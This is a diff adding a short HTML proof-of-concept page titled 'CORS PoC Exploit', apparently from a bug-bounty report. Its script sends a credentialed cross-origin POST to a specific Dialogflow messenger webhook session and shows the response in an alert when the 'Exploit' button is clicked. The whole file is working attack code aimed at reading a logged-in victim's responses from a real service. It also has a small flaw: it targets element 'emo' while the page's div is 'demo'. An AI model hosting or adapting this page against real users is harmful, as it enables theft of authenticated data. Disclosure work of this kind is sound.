@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <script>
+         function cors() {
+	        var xhttp = new XMLHttpRequest();
+		        xhttp.onreadystatechange = function() {
+			        if (this.readyState == 4 && this.status == 200) {
+			        	document.getElementById("emo").innerHTML = alert(this.responseText);
+	        }
+         };
+         xhttp.open("POST", "https://dialogflow.cloud.google.com/v1/integrations/messenger/webhook/8695d94d-3ce8-4325-9c7b-f37debc9c218/sessions/dfMessenger-78913962", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://twitter.com/AKSHAYC09Yc47">@Akshay Ravi</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
